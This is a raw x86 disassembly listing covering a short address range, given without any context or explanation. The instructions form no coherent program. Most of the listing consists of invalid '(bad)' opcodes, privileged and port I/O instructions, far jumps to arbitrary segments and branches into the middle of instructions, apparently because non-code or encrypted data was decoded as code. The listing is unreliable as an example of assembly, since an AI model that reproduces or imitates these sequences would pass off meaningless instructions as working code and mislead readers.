  41124f:	adc    esi,DWORD PTR [ecx+edx*4-0x3c]
  411253:	int3   
  411254:	xchg   edx,eax
  411255:	repz push esp
  411257:	hlt    
  411258:	xor    dh,0x1e
  41125b:	mov    cl,0x7a
  41125d:	lahf   
  41125e:	pusha  
  41125f:	jmp    0xd918:0x753411e2
  411266:	inc    edi
  411267:	sub    BYTE PTR [eax],cl
  411269:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41126a:	xchg   edi,eax
  41126b:	into   
  41126c:	gs jno 0x411244
  41126f:	ficomp WORD PTR [ebp-0x3e]
  411272:	lods   eax,DWORD PTR ds:[esi]
  411273:	add    esi,DWORD PTR [eax]
  411275:	xchg   DWORD PTR [ebp+esi*2-0x24b31781],esp
  41127c:	jge    0x4112f7
  41127e:	cli    
  41127f:	cwde   
  411280:	je     0x411247
  411282:	call   DWORD PTR [ebp-0x6cc5dfb]
  411288:	icebp  
  411289:	pop    es
  41128a:	bound  esi,QWORD PTR [ecx+0x4a]
  41128d:	and    BYTE PTR [esi+0x5b],bl
  411290:	in     al,dx
  411291:	sahf   
  411292:	xchg   ebp,eax
  411293:	dec    eax
  411294:	fwait
  411295:	and    eax,0xa05cf2d5
  41129a:	sahf   
  41129b:	push   esi
  41129c:	xor    BYTE PTR [ebp+ebp*2-0x2721d989],0x53
  4112a4:	clc    
  4112a5:	iret   
  4112a6:	push   ebp
  4112a7:	sbb    dl,bl
  4112a9:	sbb    esi,DWORD PTR [edx+0x322d7164]
  4112af:	aaa    
  4112b0:	jecxz  0x4112c2
  4112b2:	dec    ax
  4112b4:	lahf   
  4112b5:	xchg   ebx,eax
  4112b6:	fucomi st,st(4)
  4112b8:	xchg   ebp,eax
  4112b9:	xor    ah,BYTE PTR [edi]
  4112bb:	je     0x411284
  4112bd:	pop    ds
  4112be:	inc    ecx
  4112bf:	push   ecx
  4112c0:	out    dx,eax
  4112c1:	aad    0x3b
  4112c3:	xor    DWORD PTR [edi-0x19],edi
  4112c6:	arpl   WORD PTR [ebx],sp
  4112c8:	dec    esp
  4112c9:	mov    al,ds:0x96ca60d7
  4112ce:	es jne 0x4112f6
  4112d1:	lods   eax,DWORD PTR ds:[esi]
  4112d2:	fwait
  4112d3:	mov    DWORD PTR [edi+0x714fae4b],esp
  4112d9:	add    eax,0xa810978c
  4112de:	test   eax,0x63206d67
  4112e3:	aad    0xa1
  4112e5:	jle    0x41133b
  4112e7:	xor    bh,ch
  4112e9:	les    ecx,FWORD PTR [edx+0x2d]
  4112ec:	lea    ecx,[ebx]
  4112ee:	push   0xb920b1da
  4112f3:	(bad)  
  4112f4:	imul   esp,DWORD PTR [esi+0x2059f0f7],0x99e61282
  4112fe:	xchg   DWORD PTR [ecx-0x3d29e936],ebx
  411304:	sub    BYTE PTR [edx+edi*2+0x32ddfdb9],al
  41130b:	jne    0x41136b
  41130d:	push   ecx
  41130e:	loopne 0x4112a9
  411310:	sbb    esi,DWORD PTR [ebp-0x4d8e1703]
  411316:	push   edi
  411317:	xor    BYTE PTR [edx-0x221878eb],al
  41131d:	sub    eax,0xd7da1b64
  411322:	aam    0xf5
  411324:	xor    DWORD PTR [ebx+edx*1],ebp
  411327:	inc    edx
  411328:	enter  0xdca,0xc4
  41132c:	and    BYTE PTR fs:[eax-0x40],al
  411330:	arpl   WORD PTR [ecx+0x1fbe3feb],di
  411336:	(bad)  
  411337:	and    eax,DWORD PTR [edx]
  411339:	stos   DWORD PTR es:[edi],eax
  41133a:	in     eax,dx
  41133b:	test   BYTE PTR [ebx],cl
  41133d:	sub    ch,dl
  41133f:	(bad)  
  411340:	sub    esi,DWORD PTR [esi+edi*1-0x41]
  411344:	jp     0x411300
  411346:	fadd   DWORD PTR [esi+0x757364bd]
  41134c:	add    eax,0xa8edd81b
  411351:	std    
  411352:	aad    0x6b
  411354:	or     BYTE PTR [edi+edx*1-0x41],bl
  411358:	mov    dl,0xca
  41135a:	add    eax,0x9a2bd475
  41135f:	les    ebp,FWORD PTR [ebp-0x44]
  411362:	sub    edx,ebp
  411364:	jno    0x4113b7
  411366:	fidivr DWORD PTR [eax-0x2658a0eb]
  41136c:	pushf  
  41136d:	pop    ds
  41136e:	jmp    0x8804:0x3654bb08
  411375:	in     al,dx
  411376:	aad    0x1d
  411378:	inc    edx
  411379:	mov    ch,0xcd
  41137b:	pop    edx
  41137c:	mov    ah,0x2b
  41137e:	mov    WORD PTR [ebp-0x1],?
  411381:	jmp    0xb148:0x1ed66ff2
  411388:	adc    DWORD PTR [eax],eax
  41138a:	mov    esp,0x6be7407
  41138f:	mov    ebp,0x1d687746
  411394:	pop    esi
  411395:	sbb    al,0x40
  411397:	jne    0x4113e8
  411399:	and    DWORD PTR [ebx-0x84fc08c],ecx
  41139f:	test   BYTE PTR [edi+eiz*2+0x11e87522],ch
  4113a6:	rcr    esi,cl
  4113a8:	or     eax,0x5d6fed2d
  4113ad:	or     ch,BYTE PTR ds:[esi-0x52aa32f]
  4113b4:	or     DWORD PTR [eax+0x7f],esi
  4113b7:	div    DWORD PTR [esi]
  4113b9:	lods   eax,DWORD PTR ds:[esi]
  4113ba:	aad    0x5
  4113bc:	out    dx,eax
  4113bd:	inc    ebp
  4113be:	pop    eax
  4113bf:	out    0xee,eax
  4113c1:	shr    DWORD PTR [edi+0xb1dbd75],0xc9
  4113c8:	jbe    0x41134a
  4113ca:	mov    BYTE PTR [edx],bh
  4113cc:	jno    0x4113e8
  4113ce:	mov    dh,0xb8
  4113d0:	lahf   
  4113d1:	cs push ebx
  4113d3:	shl    dh,1
  4113d5:	pop    ds
  4113d6:	push   eax
  4113d7:	jb     0x4113d7
  4113d9:	imul   esp,esi,0x53f9a013
  4113df:	in     ax,0x57
  4113e2:	aad    0xdb
  4113e4:	xchg   DWORD PTR [eax],esp
  4113e6:	mov    ah,0xc5
  4113e8:	cdq    
  4113e9:	lock clc 
  4113eb:	jle    0x411401
  4113ed:	push   esi
  4113ee:	lahf   
  4113ef:	dec    ebx
  4113f0:	push   cs
  4113f1:	and    BYTE PTR [esi],ch
  4113f3:	imul   ecx,DWORD PTR [edx],0x62
  4113f6:	mov    edx,0xe1367166
  4113fb:	jg     0x41147c
  4113fd:	or     BYTE PTR ds:0x2d200926,cl
  411403:	push   ecx
  411404:	push   ss
  411405:	dec    ecx
  411406:	jmp    0xc539:0xf5075164
  41140d:	add    ch,BYTE PTR ds:0x3a387169
  411413:	into   
  411414:	imul   edx,DWORD PTR [eax+0x205df19f],0xb3007012
  41141e:	jmp    0xd5cc9e93
  411423:	sbb    al,0x35
  411425:	pop    esp
  411426:	inc    edx
  411427:	cmp    ah,dh
  411429:	les    ecx,FWORD PTR [edx]
  41142b:	xchg   edx,eax
  41142c:	in     eax,dx
  41142d:	cli    
  41142e:	popa   
  41142f:	ret    
  411430:	jae    0x41146c
  411432:	jne    0x411483
  411434:	pop    ebp
  411435:	push   ecx
  411436:	out    0xe6,al
  411438:	jno    0x411493
  41143a:	xor    edi,DWORD PTR [edx+edx*2-0x16ee3730]
  411441:	sub    eax,0x8051aac3
  411446:	push   ebp
  411447:	mov    al,0xe2
  411449:	stos   BYTE PTR es:[edi],al
  41144a:	and    al,0x18
  41144c:	jno    0x41149e
  41144e:	nop
  41144f:	or     BYTE PTR [ebx-0x680e625e],bl
  411455:	cs je  0x41149a
  411458:	(bad)  
  411459:	ins    BYTE PTR es:[edi],dx
  41145a:	aad    0x28
  41145c:	int    0x26
  41145e:	xor    ax,0xe8f
  411462:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411463:	jle    0x411456
  411465:	jmp    0x411447
  411467:	les    eax,FWORD PTR [edx+0x17750d0b]
  41146d:	mov    edi,0xcb95bfd9
  411472:	pusha  
  411473:	jbe    0x4113fc
  411475:	mov    dh,0xa7
  411477:	out    dx,eax
  411478:	jno    0x411400
  41147a:	pop    ss
  41147b:	fistp  DWORD PTR [ebp-0x5c887579]
  411481:	hlt    
  411482:	fadd   st,st(6)
  411484:	cmp    edx,DWORD PTR [esi+edx*4]
  411487:	jl     0x41147e
  411489:	sbb    esi,ebp
  41148b:	xchg   esi,eax
  41148c:	mov    edi,DWORD PTR [eax]
  41148e:	push   0x537c7145
  411493:	out    0x29,al
  411495:	iret   
  411496:	clc    
  411497:	je     0x411436
  411499:	out    0x31,eax
  41149b:	out    dx,eax
  41149c:	test   al,0x12
  41149e:	cs cmc 
  4114a0:	jno    0x4114e5
  4114a2:	jp     0x4114bb
  4114a4:	push   0x8951cfd3
  4114a9:	pop    ds
  4114aa:	in     al,0x5c
  4114ac:	ds inc ecx
  4114ae:	pop    esi
  4114af:	xor    DWORD PTR [ebx-0x42],ecx
  4114b2:	repz xchg esi,eax
  4114b4:	jns    0x4114ca
  4114b6:	(bad)  
  4114b7:	sub    al,0xc6
  4114b9:	mov    es,WORD PTR [edi+0x2f]
  4114bc:	in     eax,0x5b
  4114be:	mov    al,fs:0xfcb8c28e
  4114c4:	mov    ch,0x8a
  4114c6:	fadd   QWORD PTR [esi+ebp*2-0xa]
  4114ca:	mov    dl,0x9a
  4114cc:	jno    0x41150e
  4114ce:	hlt    
  4114cf:	mov    esp,0xc2c87cb7
  4114d4:	or     al,0x20
  4114d6:	fwait
  4114d7:	pop    es
  4114d8:	dec    edx
  4114d9:	ja     0x4114f2
  4114db:	jecxz  0x4114cc
  4114dd:	mov    BYTE PTR [esi+0x20],0x71
  4114e1:	stc    
  4114e2:	adc    eax,esp
  4114e4:	in     al,0xa9
  4114e6:	(bad)  
  4114e7:	dec    esp
  4114e8:	sub    BYTE PTR [eax],ah
  4114ea:	dec    esp
  4114eb:	test   DWORD PTR [edi],edi
  4114ed:	mov    ebp,0x60ab40d8
  4114f2:	fadd   st(5),st
  4114f4:	jo     0x411570
  4114f6:	cmp    bh,dl
  4114f8:	cmp    bl,dh
  4114fa:	sbb    al,0x3b
  4114fc:	aam    0x2d
  4114fe:	dec    ebx
  4114ff:	sub    eax,0xe5856edc
  411504:	or     cl,BYTE PTR [edx+eax*8+0x2c]
  411508:	in     eax,0x21
  41150a:	adc    eax,0x153ae87f
  41150f:	inc    ebx
  411510:	pop    ds
  411511:	mov    bh,0xd5
  411513:	pop    edx
  411514:	fsub   DWORD PTR [ebx-0x5cfd063]
  41151a:	hlt    
  41151b:	ja     0x4114fe
  41151d:	das    
  41151e:	repnz fild QWORD PTR [eax]
  411521:	and    ebp,edx
  411523:	(bad)  
  411524:	cs jne 0x411543
  411527:	and    eax,0x75b4c267
  41152c:	dec    esp
  41152d:	inc    ecx
  41152e:	mov    eax,0xe4396ab5
  411533:	push   es
  411534:	call   0xef010917
  411539:	test   DWORD PTR [ebp+0x39],edx
  41153c:	aaa    
  41153d:	mov    dh,0x6d
  41153f:	push   esi
  411540:	test   DWORD PTR [ecx],0xbe5176b5
  411546:	(bad)  
  411547:	mov    esi,0x49c88e48
  41154c:	mov    esp,0xcf2bf92d
  411551:	xchg   edx,eax
  411552:	xlat   BYTE PTR ds:[ebx]
  411553:	or     BYTE PTR [edx],ch
  411555:	add    DWORD PTR [ebx+0x55],edx
  411558:	pop    ds
  411559:	jno    0x411517
  41155b:	jne    0x4114f8
  41155d:	fs cwde 
  41155f:	mov    ebp,0xcd32523e
  411564:	mov    ss,WORD PTR [ebx]
  411566:	mov    edi,0x1856713d
  41156b:	bound  edi,QWORD PTR [edx+0x7293a180]
  411571:	push   eax
  411572:	dec    ebx
  411573:	mov    ch,0x8a
  411575:	jp     0x411538
  411577:	dec    edx
  411578:	push   0xa163d748
  41157d:	data16 (bad) 
  411580:	data16 cmp BYTE PTR [edx+0x721fbacd],0x5a
  411588:	jg     0x411547
  41158a:	cmp    al,0xac
  41158c:	pop    eax
  41158d:	adc    al,0xd6
  41158f:	mov    eax,ds:0x738dc948
  411594:	aaa    
  411595:	jl     0x41155d
  411597:	jne    0x4115cc
  411599:	pop    DWORD PTR [ebp-0x65]
  41159c:	cwde   
  41159d:	jge    0x411610
  41159f:	lea    esi,[ecx-0x20]
  4115a2:	or     esp,DWORD PTR [eax+ebx*8+0x1d3eebeb]
  4115a9:	adc    DWORD PTR cs:[ebx-0x16],esp
  4115ad:	pop    es
  4115ae:	jge    0x411596
  4115b0:	mov    ebx,0x7801e98f
  4115b5:	push   eax
  4115b6:	aad    0xec
  4115b8:	ds stc 
  4115ba:	out    0x2f,eax
  4115bc:	adc    bh,BYTE PTR [ebp+ecx*8+0x75]
  4115c0:	aad    0xb7
  4115c2:	pop    ebp
  4115c3:	test   eax,0x372fdc8d
  4115c8:	mov    ?,esi
  4115ca:	xor    BYTE PTR [edx+0x72],ch
  4115cd:	sub    BYTE PTR [ebp-0x4e0b48d3],dh
  4115d3:	(bad)  
  4115d4:	fcomp  DWORD PTR [edi]
  4115d6:	push   eax
  4115d7:	das    
  4115d8:	in     al,0x24
  4115da:	mov    ebx,edx
  4115dc:	jmp    ecx
  4115de:	aad    0x27
  4115e0:	rcl    DWORD PTR [eax-0x17],cl
  4115e3:	mov    al,0xf4
  4115e5:	cmp    DWORD PTR [ecx-0x6f],ecx
  4115e8:	push   ebp
  4115e9:	inc    ecx
  4115ea:	je     0x411621
  4115ec:	cmc    
  4115ed:	jo     0x411658
  4115ef:	mov    al,0x9d
  4115f1:	loop   0x4115c9
  4115f3:	adc    bh,BYTE PTR [ebp-0x8]
  4115f6:	xchg   ebp,eax
  4115f7:	sti    
  4115f8:	cdq    
  4115f9:	add    al,ah
  4115fb:	fdivr  DWORD PTR [eax-0x19]
  4115fe:	push   esp
  4115ff:	je     0x41162f
  411601:	daa    
  411602:	mov    ebx,0x25d853d7
  411607:	xchg   ebp,eax
  411608:	add    DWORD PTR [ebp-0x33],ebx
  41160b:	dec    esi
  41160c:	jno    0x4115b9
  41160e:	clc    
  41160f:	mul    DWORD PTR [edx]
  411611:	xlat   BYTE PTR ds:[ebx]
  411612:	cmp    eax,0xa61fb1fd
  411617:	ds dec edi
  411619:	adc    BYTE PTR [edx+0x1e],cl
  41161c:	pop    es
  41161d:	xor    ebp,edx
  41161f:	out    dx,eax
  411620:	int    0x49
  411622:	or     bh,al
  411624:	scas   al,BYTE PTR es:[edi]
  411625:	and    al,0xf1
  411627:	mov    al,ds:0x80936180
  41162c:	sub    al,BYTE PTR [edx+0x55]
  41162f:	out    dx,eax
  411630:	(bad)  
  411631:	(bad)  
  411633:	xchg   edi,eax
  411634:	in     eax,0xec
  411636:	lea    ebx,[edx+0x71]
  411639:	in     al,0xb5
  41163b:	add    eax,0x416486a
  411640:	in     al,0x45
  411642:	xor    al,0xe4
  411644:	repz pop ds
  411646:	mov    cl,0xb5
  411648:	mov    eax,ds:0xaf83f51e
  41164d:	shr    BYTE PTR [ebx+0x1de73675],0x19
  411654:	cld    
  411655:	std    
  411656:	sbb    esi,DWORD PTR [ebp-0x4a]
  411659:	sub    ebx,edi
  41165b:	arpl   ax,ax
  41165d:	pop    ebx
  41165e:	push   esp
  41165f:	sub    esi,DWORD PTR [ecx-0x2f]
  411662:	jg     0x4116d0
  411664:	ret    
  411665:	popf   
  411666:	into   
  411667:	xchg   ecx,eax
  411668:	out    dx,al
  411669:	pop    ds
  41166a:	pusha  
  41166b:	push   edi
  41166c:	jp     0x4116b8
  41166e:	and    BYTE PTR [eax-0x70],ch
  411671:	dec    esi
  411672:	aad    0x54
  411674:	fisttp QWORD PTR [edi+0x33409ecd]
  41167a:	jecxz  0x4116f5
  41167c:	retf   
  41167d:	cwde   
  41167e:	inc    esi
  41167f:	pop    edx
  411680:	and    DWORD PTR [ebx+0x37a2f892],0xffffffd5
  411687:	repnz fnstenv [edi+0xf5ca1b1]
  41168e:	jle    0x41170a
  411690:	out    0x60,eax
  411692:	sbb    ah,cl
  411694:	cdq    
  411695:	cmp    al,0x61
  411697:	mov    ch,0x4e
  411699:	ins    DWORD PTR es:[edi],dx
  41169a:	imul   edi,DWORD PTR [edi-0x6d],0x7055d715
  4116a1:	inc    esp
  4116a2:	ja     0x411675
  4116a4:	arpl   sp,di
  4116a6:	inc    esi
  4116a7:	fwait
  4116a8:	inc    ebp
  4116a9:	xchg   ebp,eax
  4116aa:	adc    DWORD PTR [ebp+0x78],esi
  4116ad:	dec    ebx
  4116ae:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4116af:	add    al,0xb8
  4116b1:	loopne 0x411634
  4116b3:	(bad)  
  4116b4:	jg     0x4116ac
  4116b6:	icebp  
  4116b7:	lods   al,BYTE PTR fs:[esi]
  4116b9:	mov    edi,0xe2b1b46c
  4116be:	pusha  
  4116bf:	lock add eax,0xbb8b820
  4116c5:	fwait
  4116c6:	jl     0x4116ef
  4116c8:	mov    esi,0x715dcfc5
  4116cd:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4116ce:	das    
  4116cf:	adc    BYTE PTR [ecx+eiz*8-0x6f863f76],0x9
  4116d7:	addr16 xor eax,0x12e8333f
  4116dd:	loopne 0x411689
  4116df:	pusha  
  4116e0:	xchg   esi,eax
  4116e1:	test   eax,0x477191cf
  4116e6:	xor    eax,0xed66aa31
  4116eb:	and    al,0x73
  4116ed:	cmp    eax,0xa108f97b
  4116f2:	je     0x4116f9
  4116f4:	jecxz  0x411772
  4116f6:	adc    DWORD PTR [ebp+0x1e],ecx
  4116f9:	push   ecx
  4116fa:	aad    0xd6
  4116fc:	inc    ebx
  4116fd:	mov    ecx,0x3b83cc28
  411702:	push   0xb9c50b75
  411707:	call   0x7071:0x5feb3d61
  41170e:	adc    bl,BYTE PTR [bx+si-0x4f]
  411712:	mov    esp,eax
  411714:	mov    eax,ds:0x2d750d17
  411719:	fwait
  41171a:	xchg   edx,eax
  41171b:	xchg   esp,eax
  41171c:	or     ebp,esp
  41171e:	xor    al,0x56
  411720:	ins    BYTE PTR es:[edi],dx
  411721:	call   0x8dd89360
  411726:	fsub   st,st(1)
  411728:	jno    0x411784
  41172a:	cdq    
  41172b:	es and al,0x4d
  41172e:	jl     0x4117a5
  411730:	retf   0x7d60
  411733:	lea    ebp,[edx-0x10]
  411736:	cmp    al,0x1e
  411738:	jno    0x4116c6
  41173a:	or     DWORD PTR [ebp+0x4d],esp
  41173d:	or     ebp,edx
  41173f:	jg     0x4116de
  411741:	pop    ds
  411742:	ret    0x7820
  411745:	xchg   edi,eax
  411746:	arpl   WORD PTR [ecx-0x202a89ac],ax
  41174c:	test   BYTE PTR [eax],bl
  41174e:	leave  
  41174f:	div    BYTE PTR [ecx]
  411751:	out    dx,al
  411752:	pop    ecx
  411753:	imul   edi,DWORD PTR [ebx+0x260f841f],0x3c595b61
  41175d:	inc    edx
  41175e:	aad    0xa3
  411760:	cmp    ebx,DWORD PTR [eax-0x50275884]
  411766:	aas    
  411767:	jne    0x411729
  411769:	mov    BYTE PTR [edx-0x4b],ah
  41176c:	in     eax,0xfb
  41176e:	xchg   esp,eax
  41176f:	xor    DWORD PTR [ecx+0x22],0xffffffc2
  411773:	cmp    BYTE PTR cs:[esi],bl
  411776:	inc    ecx
  411777:	mov    ecx,0xf66420cb
  41177c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41177d:	sbb    ecx,DWORD PTR [eax+esi*4-0x3e171bff]
  411784:	jno    0x4117ea
  411786:	nop
  411787:	inc    esp
  411788:	out    dx,eax
  411789:	xchg   esp,eax
  41178a:	inc    ebp
  41178b:	mov    dh,0xa1
  41178d:	and    BYTE PTR [ecx+0x5643984d],bh
  411793:	(bad)  [edx+0x1b]
  411796:	push   0xffffffd2
  411798:	leave  
  411799:	xor    dl,dh
  41179b:	jbe    0x411761
  41179d:	mov    BYTE PTR [ebx+0x6e],bl
  4117a0:	jp     0x4117a1
  4117a2:	scas   al,BYTE PTR es:[edi]
  4117a3:	xor    al,0xb8
  4117a5:	pop    ds
  4117a6:	cmp    al,0x72
  4117a8:	xchg   ecx,eax
  4117a9:	fwait
  4117aa:	mov    esi,0xd570c304
  4117af:	sbb    eax,0xf4bf8309
  4117b4:	or     BYTE PTR [ebp+0x69d37507],0x81
  4117bb:	mov    eax,ds:0x9d66f67c
  4117c0:	jno    0x41179e
  4117c2:	mov    BYTE PTR [ebx-0x4f59f7b3],al
  4117c8:	test   BYTE PTR [edi],bl
  4117ca:	int3   
  4117cb:	mov    ebx,0xdc1f8e14
  4117d0:	stos   BYTE PTR es:[edi],al
  4117d1:	jae    0x4117a8
  4117d3:	xchg   BYTE PTR [edi+0x57],cl
  4117d6:	mov    BYTE PTR [edi+0x754470be],bl
  4117dc:	rol    BYTE PTR [eax+edx*2],0x2f
  4117e0:	add    ebp,eax
  4117e2:	mov    ebp,0x7eb780f
  4117e7:	mov    ch,0x2d
  4117e9:	push   es
  4117ea:	(bad)  
  4117eb:	fucomi st,st(0)
  4117ed:	mov    ebp,0x5b257505
  4117f2:	dec    edx
  4117f3:	mov    ds:0x23f43fcb,eax
  4117f8:	jno    0x41178c
  4117fa:	sub    ch,BYTE PTR [ebx+eiz*4]
  4117fd:	(bad)  
  4117fe:	mov    al,ds:0xbe20433f
  411803:	and    edx,DWORD PTR [eax-0x13]
  411806:	pop    esp
  411807:	inc    ecx
  411808:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411809:	es aad 0xca
  41180c:	xlat   BYTE PTR ds:[ebx]
  41180d:	aaa    
  41180e:	(bad)  
  41180f:	(bad)
  411813:	jne    0x41182e
  411815:	and    BYTE PTR [ebx+0x382baec8],0xcc
  41181c:	stos   DWORD PTR es:[edi],eax
  41181d:	inc    esp
  41181e:	int3   
  41181f:	cmc    
  411820:	add    al,0xf8
  411822:	and    BYTE PTR [eax-0x29],0xcb
  411826:	popf   
  411827:	jmp    0xf417:0xe2181fe5
  41182e:	gs aad 0x87
  411831:	not    ch
  411833:	mov    DWORD PTR [edi],esi
  411835:	push   ebp
  411836:	mov    bl,0xb6
  411838:	pop    ebp
  411839:	rcr    DWORD PTR [esp+esi*8-0x2201dfb0],cl
  411840:	scas   eax,DWORD PTR es:[edi]
  411841:	retf   0x86ce
  411844:	xchg   esi,eax
  411845:	xchg   ecx,eax
  411846:	hlt    
  411847:	and    ebp,DWORD PTR [eax+0x2f]
  41184a:	push   ebp
  41184b:	xchg   edi,eax
  41184c:	mov    edi,0x8ee8b2d3
  411851:	pop    ds
  411852:	jge    0x4118a7
  411854:	out    0x5f,eax
  411856:	js     0x4117fa
  411858:	lods   al,BYTE PTR ds:[esi]
  411859:	adc    edi,DWORD PTR [edx+0x16a7145]
  41185f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411860:	fadd   QWORD PTR [ecx+0x2053cc5f]
  411866:	inc    ebx
  411867:	shl    DWORD PTR [ecx+0x7327948e],0x1d
  41186e:	(bad)  
  41186f:	jae    0x4117fc
  411871:	out    0x29,al
  411873:	cmc    
  411874:	out    dx,al
  411875:	inc    ecx
  411876:	or     BYTE PTR [edx+ecx*1-0x118b2634],0xd
  41187e:	jmp    0x4118fc
  411880:	adc    al,0xa6
  411882:	aad    0x9e
  411884:	mov    edx,0x64ce9501
  411889:	jecxz  0x41181e
  41188b:	jbe    0x411836
  41188d:	fsubr  QWORD PTR [esi+ebx*2+0x6d67ed6c]
  411894:	and    esi,DWORD PTR [ebp-0x1e46ca2b]
  41189a:	cli    
  41189b:	sbb    eax,0x756998d9
  4118a0:	cmp    al,0xfd
  4118a2:	fwait
  4118a3:	xchg   edi,eax
  4118a4:	add    DWORD PTR [edx-0x318ec658],ebp
  4118aa:	loope  0x41189b
  4118ac:	jp     0x41191f
  4118ae:	dec    ebx
  4118af:	lds    esi,FWORD PTR [esi+0x59]
  4118b2:	sbb    ah,bh
  4118b4:	jno    0x4118bc
  4118b6:	imul   ecx,DWORD PTR [esi-0x18c8ee9],0x71
  4118bd:	mov    bh,0x8a
  4118bf:	scas   eax,DWORD PTR es:[edi]
  4118c0:	int    0x1d
  4118c2:	or     edx,eax
  4118c4:	retf   
  4118c5:	pop    ds
  4118c6:	(bad)  
  4118c7:	pop    ebx
  4118c8:	out    0x93,al
  4118ca:	or     eax,0xd5252e56
  4118cf:	jno    0x41186d
  4118d1:	ds int3 
  4118d3:	jno    0x4118d0
  4118d5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4118d6:	sti    
  4118d7:	in     eax,0x7f
  4118d9:	cmp    al,0xb8
  4118db:	sub    cl,al
  4118dd:	fistp  WORD PTR [ebx+0x61c30c6d]
  4118e3:	pop    edx
  4118e4:	js     0x411897
  4118e6:	mov    ?,WORD PTR [ebx]
  4118e8:	arpl   WORD PTR [ebx-0x4b],cx
  4118eb:	pop    ebx
  4118ec:	ja     0x411965
  4118ee:	cmp    eax,0x13b28075
  4118f3:	dec    edi
  4118f4:	push   DWORD PTR [edx+eax*1+0x12]
  4118f8:	jno    0x41193c
  4118fa:	lahf   
  4118fb:	into   
  4118fc:	bound  edx,QWORD PTR ds:0x93738ec8
  411902:	or     eax,0x47ad3083
  411907:	dec    esi
  411908:	mov    cl,0xaf
  41190a:	or     al,0xb5
  41190c:	mov    esi,fs
  41190e:	adc    bl,BYTE PTR [esi]
  411910:	call   0xc898:0x94f79f1f
  411917:	pop    esp
  411918:	sub    DWORD PTR [edx],0xffffffb1
  41191b:	pop    edx
  41191c:	fwait
  41191d:	aad    0xd5
  41191f:	ret    0x7ea2
  411922:	push   ss
  411923:	mov    ?,WORD PTR [ecx-0x54]
  411926:	lock cmp eax,0xdb3ae7ec
  41192c:	sar    DWORD PTR [esi],cl
  41192e:	sbb    dh,0xdb
  411931:	lahf   
  411932:	push   edi
  411933:	mov    edi,0xcb846b59
  411938:	jno    0x4118f1
  41193a:	jecxz  0x41195c
  41193c:	sbb    BYTE PTR [esi+0x75],0x19
  411940:	dec    edx
  411941:	and    BYTE PTR [edi+0x50],dh
  411944:	sbb    eax,DWORD PTR [eax+edi*4-0x2a8742ad]
  41194b:	in     eax,dx
  41194c:	cmp    DWORD PTR [edi+0x3691c785],ecx
  411952:	mov    esi,DWORD PTR [ebp-0x1b]
  411955:	jl     0x41192b
  411957:	jo     0x4119d2
  411959:	add    al,0x90
  41195b:	iret   
  41195c:	jb     0x411966
  41195e:	rcl    DWORD PTR [edx-0x39],cl
  411961:	(bad)  
  411962:	or     eax,0x387b6d8b
  411967:	jne    0x4119a2
  411969:	icebp  
  41196a:	iret   
  41196b:	test   ecx,edx
  41196d:	add    eax,0xb38da40b
  411972:	xchg   ebx,eax
  411973:	mov    edi,0x5c96d1bf
  411978:	or     BYTE PTR [ecx+0x55],dl
  41197b:	jl     0x411935
  41197d:	int    0x5c
  41197f:	jne    0x411913
  411981:	sahf   
  411982:	and    eax,0xd16b1e0a
  411987:	in     eax,dx
  411988:	js     0x4119d2
  41198a:	and    dl,BYTE PTR [ecx-0x6cda69bb]
  411990:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411991:	xor    DWORD PTR [edi-0x18],ebp
  411994:	dec    eax
  411995:	and    BYTE PTR [ebx],al
  411997:	or     DWORD PTR [edx],edx
  411999:	fs dec ecx
  41199b:	mov    DWORD PTR [edi+eiz*2-0x2b],ecx
  41199f:	xor    al,0x47
  4119a1:	jne    0x41193b
  4119a3:	int    0x74
  4119a5:	push   edx
  4119a6:	jl     0x411a1d
  4119a8:	jecxz  0x411a11
  4119aa:	adc    eax,0x5a47b300
  4119af:	outs   dx,BYTE PTR ds:[esi]
  4119b0:	or     DWORD PTR [edi-0x406de524],ecx
  4119b6:	mov    dl,BYTE PTR [eax+ebx*4+0x353045cd]
  4119bd:	mov    eax,ds:0xbe7875d4
  4119c2:	add    DWORD PTR [ebp+0x6e],edx
  4119c5:	lds    ebx,FWORD PTR [edx+esi*4]
  4119c8:	mov    ss,WORD PTR [edi+0x303191df]
  4119ce:	sub    bh,BYTE PTR [eax+0x1f]
  4119d1:	push   cs
  4119d2:	mov    esi,0xdc3a8875
  4119d7:	push   ebx
  4119d8:	call   0x2fec:0x7419a9cf
  4119df:	jne    0xb65e6ba2
  4119e5:	add    ch,bh
  4119e7:	nop
  4119e8:	sti    
  4119e9:	mov    dh,0x53
  4119eb:	jne    0x411a34
  4119ed:	mov    edi,0x7d69e6ff
  4119f2:	rol    DWORD PTR [esp+esi*2],cl
  4119f5:	mov    al,0x6f
  4119f7:	repnz aas 
  4119f9:	pop    es
  4119fa:	sbb    DWORD PTR [ecx+edx*4],edx
  4119fd:	xchg   BYTE PTR [edi+0x7a216f25],ah
  411a03:	sub    ch,BYTE PTR [ecx-0x3d]
  411a06:	mov    dl,0x11
  411a08:	(bad)  
  411a0a:	mov    edx,0xd9b4787d
  411a0f:	aas    
  411a10:	mov    WORD PTR ds:0x934a72c5,?
  411a16:	(bad)  [ecx+eax*8+0x4e]
  411a1a:	stos   DWORD PTR es:[edi],eax
  411a1b:	push   esi
  411a1c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411a1d:	data16 je 0x411a22
  411a20:	lock add dl,dh
  411a23:	push   0x99c38030
  411a28:	xchg   edi,eax
  411a29:	int3   
  411a2a:	fwait
  411a2b:	in     eax,dx
  411a2c:	(bad)  
  411a2d:	pop    ds
  411a2e:	ja     0x411a40
  411a30:	sub    BYTE PTR [ebx+0x71],bh
  411a33:	mov    dh,0x7c
  411a35:	scas   al,BYTE PTR es:[edi]
  411a36:	aad    0x23
  411a38:	and    eax,0xdc0c172d
  411a3d:	ror    BYTE PTR [esi],cl
  411a3f:	jne    0x411a89
  411a41:	push   ss
  411a42:	popa   
  411a43:	cmp    al,BYTE PTR [esi+0x74]
  411a46:	cmp    DWORD PTR [eax],0x71
  411a49:	enter  0x854d,0x23
  411a4d:	sub    al,0xb0
  411a4f:	ins    BYTE PTR es:[edi],dx
  411a50:	lock pop ds
